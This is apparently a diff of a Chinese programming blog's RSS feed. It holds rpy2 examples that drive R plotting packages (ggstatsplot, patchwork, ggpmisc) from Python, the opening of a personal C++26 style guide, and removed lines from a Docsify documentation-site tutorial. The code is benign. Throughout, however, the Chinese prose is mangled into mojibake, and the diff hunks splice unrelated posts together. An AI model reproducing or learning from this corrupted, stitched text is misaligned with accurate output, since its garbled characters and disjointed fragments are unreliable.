+<p class="ds-markdown-paragraph">R ç¬æä¼å¿<span>ï¼èªå¨è¿è¡æ¹å·®åæ / t æ£éªï¼å¹¶æ p å¼ãæåºéãæ¾èæ§æ æ³¨ç´æ¥ç»å¨å¾ä¸ï¼ç¬¦åé¡¶åé£æ ¼ãPython çæç®åæ²¡æ<span>åç­çº§å«çåºã</span></span></p>
+<div class="cnblogs_code">
+<pre><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> pandas as pd
+</span><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> rpy2.robjects as ro
+ro.r(</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">Sys.setenv(LANGUAGE="en")</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">)
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> rpy2.robjects <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> pandas2ri
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> rpy2.robjects.packages <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> importr
+
+pandas2ri.activate()
+
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> çæä¸äºä¸ç»æ°æ®</span>
+df =<span style="color: rgba(0, 0, 0, 1)"> pd.DataFrame({
+    </span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">score</span><span style="color: rgba(128, 0, 0, 1)">'</span>: [85, 90, 88, 92, 87, 70, 75, 72, 68, 71, 55, 60, 58, 62, 59<span style="color: rgba(0, 0, 0, 1)">],
+    </span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">method</span><span style="color: rgba(128, 0, 0, 1)">'</span>: [<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">A</span><span style="color: rgba(128, 0, 0, 1)">'</span>]*5 + [<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">B</span><span style="color: rgba(128, 0, 0, 1)">'</span>]*5 + [<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">C</span><span style="color: rgba(128, 0, 0, 1)">'</span>]*5<span style="color: rgba(0, 0, 0, 1)">
+})
+ro.globalenv[</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">df</span><span style="color: rgba(128, 0, 0, 1)">'</span>] =<span style="color: rgba(0, 0, 0, 1)"> df
+
+ro.r(</span><span style="color: rgba(128, 0, 0, 1)">'''</span><span style="color: rgba(128, 0, 0, 1)">
+library(ggplot2)
+library(ggstatsplot)
+p &lt;- ggbetweenstats(
+  data = df,
+  x = method,
+  y = score,
+  type = "parametric",
+  title = "Comparison of Teaching Methods",
+  caption = "Auto: F-value, p-value, eta^2"
+)
+ggsave("statsplot.png", p, width=8, height=5, dpi=300)
+</span><span style="color: rgba(128, 0, 0, 1)">'''</span><span style="color: rgba(0, 0, 0, 1)">)
+
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> ç¨ä½ çé»è®¤å¾çæ¥çå¨æå¼</span>
+<span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> os
+os.startfile(</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">statsplot.png</span><span style="color: rgba(128, 0, 0, 1)">"</span>)</pre>
+</div>
+<p><img alt="image" width="689" height="431" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2958730/202606/2958730-20260620231724759-1151543057.png" class="lazyload"></p>
+<p class="ds-markdown-paragraph">å­¦ä¹ ç¹<span>ï¼</span></p>
+<ul>
+<li>
+<p class="ds-markdown-paragraph"><span>ä½ ä¸ç¨èªå·±å <code>scipy.stats.f_oneway</code><span>ï¼ä¸ç¨ç®æåºéï¼ä¸ç¨æå·¥å¨å¾ä¸æ  p å¼ã</span></span></p>
+</li>
+<li>
+<p class="ds-markdown-paragraph"><code>ggstatsplot</code><span> èªå¨å®æç»è®¡æ¨æ­ + å¯è§åï¼æ¯æ²éæ°æ®åæä¸è®ºææå¾çç»ææ·å¾ã</span></p>
+</li>
+<li>
+<p class="ds-markdown-paragraph"><span>è¿ç§å¾å¨å¿çå­¦ãå»å­¦ãæè²å­¦ç­éè¦å±ç¤ºç»è®¡ç»æçç¤¾ä¼ç§å­¦æåä¸­æåæ¬¢è¿ã</span></p>
+</li>
+</ul>
+<h3><span>ä¾ 2ï¼<code>patchwork</code><span> æ¼å¾ ââ ä»»æç»åå¤å¼ å¾ï¼å¯¹é½åºççº§</span></span></h3>
+<p class="ds-markdown-paragraph">R ç¬æä¼å¿<span>ï¼åæ­ç§¯æ¨ä¸æ ·ç¨ <code>|</code><span>ã<code>/</code><span>ã<code>+</code><span> ç»åå¤å¹ <code>ggplot2</code><span> å¾ï¼èªå¨å¯¹é½åæ è½´ãå¾ä¾ãè¾¹è·ãPython ç <code>matplotlib</code><span> å­å¾å¸å±é¾ä»¥è¾¾å°åæ ·çç²¾ç¡®åº¦åç¾å­¦ã</span></span></span></span></span></span></p>
+<div class="cnblogs_code">
+<pre><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> os
+</span><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> pandas as pd
+</span><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> rpy2.robjects as ro
+ro.r(</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">Sys.setenv(LANGUAGE="en")</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">)
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> rpy2.robjects <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> pandas2ri
+pandas2ri.activate()
+
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> ç´æ¥æ¿ ggplot2 éç mpg æ°æ®</span>
+ro.globalenv[<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">mpg</span><span style="color: rgba(128, 0, 0, 1)">'</span>] = ro.r(<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">ggplot2::mpg</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">)
+
+ro.r(</span><span style="color: rgba(128, 0, 0, 1)">'''</span><span style="color: rgba(128, 0, 0, 1)">
+library(ggplot2)
+library(patchwork)
+
+p1 &lt;- ggplot(mpg, aes(displ, hwy)) + 
+        geom_point(aes(color = class)) + 
+        geom_smooth(se = FALSE) + 
+        theme_minimal()
+
+p2 &lt;- ggplot(mpg, aes(class)) + 
+        geom_bar(fill = "steelblue") + 
+        coord_flip() + 
+        theme_minimal()
+
+p3 &lt;- ggplot(mpg, aes(cty, hwy)) + 
+        geom_point(alpha = 0.3) + 
+        facet_wrap(~ year) + 
+        theme_minimal()
+
+combined &lt;- (p1 / p2) | p3 + 
+  plot_annotation(title = "æ±½è½¦æ°æ®å¤ç»´åº¦å±ç¤º", tag_levels = 'A')
+
+ggsave("patchwork_demo.png", combined, width=12, height=7, dpi=300)
+</span><span style="color: rgba(128, 0, 0, 1)">'''</span><span style="color: rgba(0, 0, 0, 1)">)
+
+os.startfile(</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">patchwork_demo.png</span><span style="color: rgba(128, 0, 0, 1)">"</span>)</pre>
+</div>
+<p><img alt="patchwork_demo" width="672" height="392" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2958730/202606/2958730-20260620231804716-1258136765.png" class="lazyload"></p>
+<p class="ds-markdown-paragraph">å­¦ä¹ ç¹<span>ï¼</span></p>
+<ul>
+<li>
+<p class="ds-markdown-paragraph"><code>patchwork</code><span> çå¸å±è¯­æ³æå¶ç´è§ï¼<code>(A / B) | C</code><span> è¡¨ç¤º A å¨ B ä¸é¢ï¼æ´ååä¸ C å·¦å³æåã</span></span></p>
+</li>
+<li>
+<p class="ds-markdown-paragraph"><span>èªå¨å¯¹é½åæ è½´ãå¾ä¾ä½ç½®ï¼è¾åºå¾çå¯ç´æ¥ç¨äºè®ºæï¼æ éåææå¨å¾®è°ã</span></p>
+</li>
+<li>
+<p class="ds-markdown-paragraph"><span>è¿ç§âåä»£ç åè®¾è®¡çé¢âçä½éªï¼æ¯ç®å <code>matplotlib</code><span> ç <code>subplot2grid</code><span> ç­é¾ä»¥ä¼åçã</span></span></span></p>
+</li>
+</ul>
+<h3><span>ä¾ 3ï¼é«çº§ <code>ggplot2</code><span> åé¢ + ç»è®¡åæ¢ + èªå®ä¹æ æ³¨</span></span></h3>
+<p class="ds-markdown-paragraph">R ç¬æä¼å¿<span>ï¼åé¢æ¶å¨æ¯ä¸ªå­å¾ä¸èªå¨è®¡ç®å¹¶æ æ³¨ç¸å³ç³»æ°ãåå½çº¿ï¼ä½¿ç¨ <code>after_stat</code><span> ç­åè¿ç»è®¡åæ¢ï¼Python ç <code>plotnine</code><span> åªè½å®æåºç¡åé¢ã</span></span></span></p>
+<div class="cnblogs_code">
+<pre><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> os
+</span><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> pandas as pd
+</span><span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> rpy2.robjects as ro
+ro.r(</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">Sys.setenv(LANGUAGE="en")</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(0, 0, 0, 1)">)
+</span><span style="color: rgba(0, 0, 255, 1)">from</span> rpy2.robjects <span style="color: rgba(0, 0, 255, 1)">import</span><span style="color: rgba(0, 0, 0, 1)"> pandas2ri
+pandas2ri.activate()
+
+</span><span style="color: rgba(0, 128, 0, 1)">#</span><span style="color: rgba(0, 128, 0, 1)"> çææ¨¡ææ°æ®</span>
+df =<span style="color: rgba(0, 0, 0, 1)"> pd.DataFrame({
+    </span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">x</span><span style="color: rgba(128, 0, 0, 1)">'</span>: [1,2,3,4,5]*3<span style="color: rgba(0, 0, 0, 1)">,
+    </span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">y</span><span style="color: rgba(128, 0, 0, 1)">'</span>: [2,4,6,8,10, 1,4,7,10,13, 3,5,7,9,11<span style="color: rgba(0, 0, 0, 1)">],
+    </span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">group</span><span style="color: rgba(128, 0, 0, 1)">'</span>: [<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">çº¿æ§A</span><span style="color: rgba(128, 0, 0, 1)">'</span>]*5 + [<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">çº¿æ§B</span><span style="color: rgba(128, 0, 0, 1)">'</span>]*5 + [<span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">çº¿æ§C</span><span style="color: rgba(128, 0, 0, 1)">'</span>]*5<span style="color: rgba(0, 0, 0, 1)">
+})
+ro.globalenv[</span><span style="color: rgba(128, 0, 0, 1)">'</span><span style="color: rgba(128, 0, 0, 1)">df</span><span style="color: rgba(128, 0, 0, 1)">'</span>] =<span style="color: rgba(0, 0, 0, 1)"> df
+
+ro.r(</span><span style="color: rgba(128, 0, 0, 1)">'''</span><span style="color: rgba(128, 0, 0, 1)">
+library(ggplot2)
+library(ggpmisc)  # æä¾ geom_text_npc ç­æ æ³¨å½æ°
+
+p &lt;- ggplot(df, aes(x, y, color = group)) +
+  geom_point(size = 3) +
+  geom_smooth(method = "lm", se = TRUE, alpha = 0.2) +
+  facet_wrap(~ group, scales = "free") +
+  stat_poly_eq(
+    aes(label = paste(..eq.label.., ..rr.label.., sep = "~~~")),
+    formula = y ~ x, 
+    parse = TRUE
+  ) +
+  theme_minimal(base_size = 14) +
+  labs(title = "åé¢èªå¨æ æ³¨åå½æ¹ç¨å RÂ²")
+
+ggsave("facet_annotation.png", p, width=10, height=4, dpi=300)
+</span><span style="color: rgba(128, 0, 0, 1)">'''</span><span style="color: rgba(0, 0, 0, 1)">)
+
+os.startfile(</span><span style="color: rgba(128, 0, 0, 1)">"</span><span style="color: rgba(128, 0, 0, 1)">facet_annotation.png</span><span style="color: rgba(128, 0, 0, 1)">"</span>)</pre>
+</div>
+<p><img alt="facet_annotation" width="669" height="268" loading="lazy" data-src="https://img2024.cnblogs.com/blog/2958730/202606/2958730-20260620231840755-1854718648.png" class="lazyload"></p>
+<p class="ds-markdown-paragraph">å­¦ä¹ ç¹<span>ï¼</span></p>
+<ul>
+<li>
+<p class="ds-markdown-paragraph"><code>stat_poly_eq</code><span> è½èªå¨è®¡ç®åå½æ¹ç¨å RÂ²ï¼å¹¶ä»¥æ°å­¦å¬å¼å½¢å¼æ¸²æå¨å¾ä¸ï¼è¿å¨ä½ éè¦å±ç¤ºè¶å¿çº¿çç»è®¡ç»ææ¶æä¸ºæç¨ã</span></p>
+</li>
+<li>
+<p class="ds-markdown-paragraph"><code>facet_wrap</code><span> éå <code>scales="free"</code><span> è®©æ¯ä¸ªåé¢é½æèªå·±çåæ å°ºåº¦ï¼è¿å¾è´´åå®éæ°æ®åæã</span></span></p>
+</li>
+<li>
+<p class="ds-markdown-paragraph"><span>è¿ç§âç»è®¡ç»æç´æ¥åç°å¨å¾å½¢åç´ ä¸­âçè½åï¼æ¯ R å¯è§åææ·±éçç¾å­¦ä¹ä¸ã</span></p>
+</li>
+</ul>
+<p>&nbsp;</p>
+<p><strong>ç±æ­¤å¯ä»¥å±å¼PythonåRçç»åï¼Pythonè§£å³å·¥ç¨ä»£ç +æ°å­¦é»è¾ï¼Rä¸é¡¹è´è´£å¯è§åé¨åå®ç°ä¸¤èç»åã</strong></p>
+<p>&nbsp;</p>
+
+</div>
+<div class="clear"></div>
+
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0.002777777777777778" data-date-updated="2026-06-20 23:25">2026-06-20 23:21</span>&nbsp;
+<a href="https://www.cnblogs.com/hongbao">ä¸çå¸å</a>&nbsp;
+éè¯»(<span id="post_view_count">3</span>)&nbsp;
+è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(20671555);return false;">æ¶è</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fhongbao%2Fp%2F20671555&amp;targetId=20671555&amp;targetType=0" target="_blank">ä¸¾æ¥</a>
+</div>
+         ]]>
+    </description>
+    </item>
+<item>
+    <title><![CDATA[ lil_tea c++ 2026 style guide ]]></title>
+    <link>https://www.cnblogs.com/young-tea/p/20671493</link>
+    <guid>df4ca469667dfbfc98736a9b8f5c8d6e</guid>
+    <description>
+    <![CDATA[ 
+            <h1 class="postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/young-tea/p/20671493" title="åå¸äº 2026-06-20 22:59">
+    <span role="heading" aria-level="2">lil_tea c++ 2026 style guide</span>
     
 
 </a>
@@ -2270,163 +1901,714 @@ Terminatedï¼ç»æï¼ä¸å¯æ¢å¤ï¼
             <div class="clear"></div>
             <div class="postBody">
                 <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
-<p>æè¿å¨å ç­å ç¹çåä¸ä¸ª<a href="https://tokengine.hanyoai.com" title="Tokenå·¥å" target="_blank" rel="noopener nofollow">Tokenå·¥å</a>, æ¨¡å¼ç±»ä¼¼ä¸äº¬ä¸ï¼æèªè¥ç®åäº§ççæ¨¡åï¼ä¹å¤æ¥ç¬¬ä¸æ¹æè°æ¨¡åã</p>
-<p>ä½ä¸ºTokenèåååå¹³å°ï¼å¸®å©ææ¡£æ¯åæ§éæ±ã</p>
-<p><a href="https://docsify.js.org/#/quickstart" title="Docsify" target="_blank" rel="noopener nofollow">Docsify</a>æ¯ä¸ä¸ªå°<strong>Markdownæä»¶</strong>è½¬æ¢ä¸º<strong>åé¡µé¢éæç½ç«</strong>(æ éä»»ä½æå»ºè¿ç¨)çå¼æºé¡¹ç®ï¼å®æµä¸æ¥3minå°±è½æå»ºå¹¶æ­å»ºä¸ä¸ª å¸®å©ææ¡£ç«ç¹ã</p>
-<hr>
-<h3 id="1-docsifyå°è¯çå">1. Docsifyå°è¯çå</h3>
-<p>åç½®å®è£ç¯å¢ï¼ <code>npm i docsify-cli -g</code> å®è£docsify cliå®¢æ·ç«¯ï¼</p>
-<p>åå§åé¡¹ç®ç®å½ï¼ <code>docsify init .</code> ï¼è¿ä¼å¨å½åç®å½ä¸åå»ºå·¥ä½ç®å½ï¼é»è®¤æï¼</p>
-<ul>
-<li>index.html : æ´ç«æ¯ä¸ä¸ªåé¡µé¢éæé¡µé¢</li>
-<li>README.mdï¼  é»è®¤çä¸»é¡µ</li>
-<li>.nojekyllï¼ é²æ­¢GitHub Pageså¿½ç¥ä»¥ä¸åçº¿å¼å¤´çæä»¶</li>
-</ul>
-<p>æ¥ä¸æ¥<code>docsify serve ./</code> å°±å¯å¨å¹¶å¨localhost:3000é¨ç½²äºè¿ä¸ªå¸®å©ææ¡£ç«ç¹ï¼ææ¡£åå®¹æ¥èªREADME.mdæä»¶ï¼ é»è®¤ç»¿è²ä¸»é¢æ·±å¾æå¿ã</p>
-<p><img src="https://files.mdnice.com/user/4236/e036a9e5-5699-4fe6-8207-2f33daf4e0db.png" alt="" loading="lazy"></p>
-<h3 id="2-docsifyç¾½ç¿¼ä¸°æ»¡">2. Docsifyç¾½ç¿¼ä¸°æ»¡</h3>
-<p>ç°å¨å¯ä»¥åæ´å¤çmarkdownæä»¶ï¼<br>
-eg: guide.md, å¨åé¡µé¢<code>/#/guide</code>è®¿é®;  å­æä»¶å¤¹ ./docs/class1.md, å¨åé¡µé¢<code>/docs#/class1</code>è®¿é®</p>
-<p>ä¸ä¸ªæ´å¸¸è§çç»ç»æ¹å¼æ¯ ä¾§è¾¹æ :</p>
-<ul>
-<li>ç¼å_sidebar.mdæä»¶ï¼ æå®mdæä»¶çç»ç»åè·¯ç±</li>
-</ul>
-<pre><code>* [å¿«éæå](/ "å¿«éæå")
-* [æçå¾](text2image.md "æçå¾")
-* [æçè§é¢](text2video.md "æçè§é¢")
-* [èæäººç´ æ](assert.md "èæäººç´ æ")
-* [WorkBuddyæ¥å¥ææ¡£](WorkBuddy.md "WorkBuddyæ¥å¥ææ¡£")
+<p>lil_tea c++ 2026 style guide</p>
+<p>æ¬æä½¿ç¨ yoga air + wsl + ubuntu 26.04 + vscode ç¼å.</p>
+<blockquote>
+<p>æææ debug å®æ, æä¿è¯, codin æ¯æä¸è¾å­çæå£.</p>
+</blockquote>
+<p>è¿æ¯æå¨å¼ååç®ç«é½ä½¿ç¨çä»£ç é£æ ¼.</p>
+<blockquote>
+<p>é¨ååé´èª <a href="https://www.youtube.com/@TheCherno" target="_blank" rel="noopener nofollow">the cherno</a>, é¨ååé´èª <a href="https://google.github.io/styleguide/cppguide.html" target="_blank" rel="noopener nofollow">google c++ style guide</a>, é¨ååé´èª <a href="https://www.kernel.org/doc/html/latest/process/coding-style.html" target="_blank" rel="noopener nofollow">linux kernel coding style</a>, é¨ååé´èª <a href="%E6%B2%A1%E6%9C%89%E9%93%BE%E6%8E%A5" target="_blank" rel="noopener nofollow">ç®æ³ç«èµè¿é¶æå</a>.<br>
+<em><strong>å ä¸ºæå¹´çºªå¤§äºæä»¥å·²ç»å¿è®°åªä¸æ¡æ¯ä»åªåé´çäº, æåä»¬çå°åªæ¡è§å¾åçå°±ç¨å§, ä¸åççä¸ç¨å°±å¥½äº.</strong></em></p>
+</blockquote>
+<p>æ»ç»ä¸å¥è¯: åæ c like ç¹è²æéä¸»ä¹éè·¯, ä»¥å®å¨æ§æ¢èªç±; å§ bjarne è¿æ¯å§ graydon çé®é¢ä¸æä»¬è¦åæ bjarne é¢å¯¼, åæ k&amp;r çæåèªä¿¡, åå³æç» graydon çç³è¡£ç®å¼¹.</p>
+<blockquote>
+<p>think twice, code once. enjoy~</p>
+</blockquote>
+<h1 id="è°è¯">è°è¯</h1>
+<p>æéè¦çå½ç¶æ¯æå°å½æ°:</p>
+<pre><code class="language-cpp">void	log(long line_num) {
+#ifdef	lil_tea
+	std::println(std::cerr, "line: {} | hey siri, play &lt;hit`em up&gt; please", line_num);
+#endif
+}
 </code></pre>
-<ul>
-<li>å¨index.htmlå è½½_sidebar.mdæä»¶, æ³¨æä¸é¢ç<code>loadSideBar</code> boolå¼</li>
-</ul>
-<pre><code> &lt;script&gt;
-    window.$docsify = {
-      name: '',
-      repo: '',
-      loadSidebar: true,
-      subMaxLevel: 2
-    }
-  &lt;/script&gt;
-</code></pre>
-<p><img src="https://files.mdnice.com/user/4236/428acd40-153d-45e4-b25a-63a98c2a0371.png" alt="" loading="lazy"></p>
-<h3 id="3-docsifyåºè¥éæ±¤">3. Docsifyåºè¥éæ±¤</h3>
-<p>ä¸è¬ä¼ä½¿ç¨systemdæå¡è¿ç¨æ¥é¨ç½²Docsifyï¼å·å¤è¿ç¨ç®¡çåéè¯è½åã</p>
-<pre><code>sudo vim 
+<p>ä½æ¯åéå æ³å½æ°å¯ä»¥ææ°çåæ³äº:</p>
+<pre><code class="language-cpp">std::vector&lt;long&gt; add(const std::vector&lt;long&gt; &amp;a, const std::vector&lt;long&gt; &amp;b)
+	pre(a.size() == b.size()) {	// c++ 2026 æ°ç¹æ§, è§ [contracts](https://en.cppreference.com/w/cpp/language/contracts.html)
+	std::vector&lt;long&gt; c(a.size());
 
-[Unit]
-Description=docsify Service
-After=network.target
+	for (long x : std::views::iota(0, c.size()))
+		c[x] = a[x] + b[x];
 
-[Service]
-Type=simple
-User=ä½ çç¨æ·å
-WorkingDirectory={help-docsçå·¥ä½ç®å½}
-ExecStart=/usr/local/bin/docsify serve ./
-Restart=always
-RestartSec=10
+	return c;
+}
+</code></pre>
+<p>ç¨ contracts éå <code>g++-16 -fcontract-evaluation-semantic=quick_enforce</code> å°±åå¯ä»¥è®©ä»£ç  fail fast äº.</p>
+<h1 id="ä»£ç æ¡æ¶">ä»£ç æ¡æ¶</h1>
+<h2 id="æ è¯ç¬¦">æ è¯ç¬¦</h2>
+<p>å¨é¨ä½¿ç¨ snake_case, å STL ä¿æç»ä¸, STL ç¨ snake_case é£æä¹ç¨.</p>
+<p>è¿æ¹é¢æå bjarne çæè§ç¸å, å¯ä»¥å¨ <a href="https://www.stroustrup.com/bs_faq2.html" target="_blank" rel="noopener nofollow">bjarne stroustrup q&amp;a2</a> ç <code>how do you name variables? do you recommend "hungarian"?</code> æ¡ç®è§å° bjarne è§ç¹çè¯¦ç»éè¿°.</p>
+<h2 id="å¤´æä»¶">å¤´æä»¶</h2>
+<p>ç¨ <code>#include &lt;bits/stdc++.h&gt;</code>, æèç´æ¥ç¨ <code>import	std</code>.</p>
+<p>ä¸æ¯è¯´è¿ä¸ªä»£ç æ¯ç«èµä¸ç¨, åªè¦ g++ æä¾äºå°±è¯´æè¿ä¸ªå¤´æä»¶æ¯ææä¹ç, å¼åä¸­ä½¿ç¨ä¹æå¾å¤å¥½å¤, å¢å çç¼è¯æ¶é´å¯ä»¥å¿½ç¥ä¸è®¡.</p>
+<p>æäººè¯´è¿ä¸ªä¼å¼å¥ä¸äºç¬¦å·, è¿ä¸ªè¦åä¸¤æ¹é¢è¯´:</p>
+<ol>
+<li>å½æ°åå®¹æå²çª. ä½ ä¸ <code>using namespace std</code> åªæ¥çå½æ°åå²çª?</li>
+<li>å®åå®¹æå²çª. é¦åä½ åºè¯¥å°å®ä¹å®, å¶æ¬¡æä¸ç¥éä½ ä¸ºä»ä¹éè¦å®ä¹ä¸ä¸ªå²çªçå®å, åè¯´äºè¿éé¢å®ä¹çä»ä¹å®æ¯ä½ éè¦åå®ä¹ä¸éç?</li>
+</ol>
+<p>èä¸æç¨è¿ä¸ªå¤´æä»¶æä¸ªæ¬¡è¦ç®çæ¯ä¸ºäºé¿åæçä»£ç è¢« msvc ç¼è¯, å ä¸ºæåªè½ç¡®å®æçä»£ç å¨ç±» unix ç³»ç»ä¸ä¸åºé, windows ä¸åºä»»ä½éè¯¯é½æå¯è½.</p>
+<h2 id="å½åç©ºé´">å½åç©ºé´</h2>
+<p>ç¦æ­¢ <code>using namespace std;</code>.</p>
+<p>æ¨èçæ <code>using namespace std::literals;</code>.</p>
+<h2 id="å®">å®</h2>
+<p>ä¸è¬ä¸è¦å¨ä»£ç éç¨å®.</p>
+<p>è¿æ¹é¢æå bjarne çæè§åæ¬¡ç¸å, å¯ä»¥å¨ <a href="https://www.stroustrup.com/bs_faq2.html" target="_blank" rel="noopener nofollow">bjarne stroustrup f&amp;q2</a> ç <code>so, what's wrong with using macros?</code> æ¡ç®è§å° bjarne è§ç¹çè¯¦ç»éè¿°.</p>
+<p>ä¾å¤æåµæ¯, åå¦ä½ å«æå, ä½ å¯ä»¥å®ä¹ <code>-Dli_hua</code> è¡¨ç¤ºä½ å¨ debug, ç¶åå:</p>
+<pre><code class="language-cpp">void	log(long line_num) {
+#ifdef	li_hua
+	std::println(std::cerr, "line: {} | i`m not good at English", line_num);
+#endif
+}
+</code></pre>
+<h2 id="å¸¸é">å¸¸é</h2>
+<p>ç¨ <code>k_</code> åç¼æ¥ä»£è¡¨è¿æ¯ä¸ªå¸¸é, è½ç¨ <code>constexpr</code> å°½éç¨, å¦åç¨ <code>const</code>.</p>
+<p>æ¯å¦è¯´:</p>
+<pre><code class="language-cpp">constexpr long k_inf = 0x3f3f3f3f3f3f3f3fl;	// ç¨äºæå¤§å¼, æå°å¼ç´æ¥ç¨ -k_inf
+constexpr long k_mod = 998244353;	// ç¨äºåæ¨¡
+constexpr long k_max_vtx = 1l &lt;&lt; 17;	// ç¨äºé¡¶ç¹æ°é, 2^17 &lt;=&gt; 10^5
+</code></pre>
+<h2 id="åé">åé</h2>
+<p>å°½éç¼©å°åéçä½ç¨å, æ¯å¦ <code>for</code> ç¨çåéå°±å°½éä¸è¦è®©ä½ç¨åå° <code>for</code> å¤é¢.</p>
+<p>å¼ç¨ç¬¦å·åæéç¬¦å·ç´§è´´åé, å¦ <code>tree *ld_</code> æ <code>const std::vector&lt;long&gt; &amp;a</code>.</p>
+<p>å¨ç±»åæç¡®çæ¶åå¯ä»¥ç¨ <code>auto</code>, éè¦æç¡®ç±»åçæ¶åç¨ç±»åå.</p>
+<p>è¿ä¸ª <em><strong>æç¡®</strong></em> åæ¬å½æ°è¿åå¼çç±»å, è®¤ä¸ºæ¯æç¡®ç.</p>
+<pre><code class="language-cpp">auto tuple = std::make_tuple(1, 2, 3);
+auto x = std::move(y);
+</code></pre>
+<pre><code class="language-cpp">for (std::size_t x : std::views::iota(0uz, v.size()))
+	std::println("{}", v[x]);
+</code></pre>
+<p>å½ç¶å¸¦æå¾éåè¿è¾¹åºè¯¥ç¨ç»æåç»å®:</p>
+<pre><code class="language-cpp">for (auto [y, z] : x-&gt;to_)
+	y-&gt;dfs();
+</code></pre>
+<p>å¦æè¦ä¿®æ¹ (æ¯å¦æ è®°ä¸æ¡è¾¹) å°±ç¨å¼ç¨:</p>
+<pre><code class="language-cpp">for (auto &amp;[y, z, delta] : x-&gt;to_)
+	if (y-&gt;dfs())
+		delta = 1;
+</code></pre>
+<h2 id="å¨å±åé">å¨å±åé</h2>
+<p>å¦æå¯è½ä¼è¢«å¤ä¸ªçº¿ç¨ä¿®æ¹å°±å é, å¦æç¡®å®åªä¼è¢«åçº¿ç¨ä¿®æ¹å°±ä¸ç¨å é.</p>
+<p>ç¨ <code>namespace</code> ç®¡çå¨å±åéåå¯¹åºçé.</p>
+<pre><code class="language-cpp">namespace	total {	// å®éåéå
+long val;	// å ä½åéå
+std::mutex lock;
+}
+</code></pre>
+<p>å¨å±åéåä¸å  <code>g_</code> åç¼, æ¥è¯¢æä¿®æ¹å¨å±åéçå½æ°åéè¦å  <code>g_</code> åç¼.</p>
+<h2 id="å½æ°">å½æ°</h2>
+<p>å¤§å¤æ°å½æ°çè¿åå¼åºè¯¥åªè·åæ°æå³, ä¸ä¸ªå½æ°åªåå¥½ä¸ä»¶äº, å°½éä¸å¨å¨å±åé, å¨å¨å±åéçå½æ°çå½æ°åéè¦å  <code>g_</code> åç¼.</p>
+<p>å¦æä¸ä¸ªåæ°ä¸å, ä¸å®è¦å  <code>const</code>. æ¯å¦åæé£ä¸ªåéå æ³å½æ°.</p>
+<p>å¦æä¸¤ä¸ªåæ°æåçåå®¹ä¸ä¼éå , ä¸å®è¦å  <code>restrict</code>. ä¼åçä½ç¨å¯¹ææ¥è¯´å¹¶ä¸éè¦å ææä¿¡ä»» <code>-O2</code>, ä½è¿æ ·å¯ä»¥æéæå¤æ¬¡æ£æ¥ä¸è¦ä¼ å¥éå çä¸è¥¿.</p>
+<p>åçæåµä¸å¯ä»¥ç¨è¿ç®ç¬¦éè½½.</p>
